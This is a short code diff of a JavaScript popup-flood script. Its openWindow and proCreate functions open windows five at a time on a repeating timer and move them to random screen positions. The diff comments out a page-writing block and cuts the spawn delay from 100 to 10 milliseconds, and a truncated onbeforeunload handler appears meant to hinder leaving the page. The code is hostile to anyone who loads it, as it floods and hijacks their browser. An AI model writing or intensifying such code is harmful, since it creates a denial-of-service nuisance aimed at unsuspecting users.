@@ -11,7 +11,7 @@ function openWindow(url) {
 
         newWin.moveTo(randomX, randomY);
 
-        // Write custom content inside the blank page
+        /*// Write custom content inside the blank page
         newWin.document.write(`
             <html>
                 <head>
@@ -30,7 +30,7 @@ function openWindow(url) {
                     </script>
                 </body>
             </html>
-        `);
+        `);*/
     }
 
     return newWin;
@@ -41,7 +41,7 @@ function proCreate() {
         for (var i = 0; i < 5; i++) {
             openWindow('');
         }
-    }, 100); // Adjust delay as needed
+    }, 10); // Adjust delay as needed
 }
 
 window.onbeforeunload = function () {
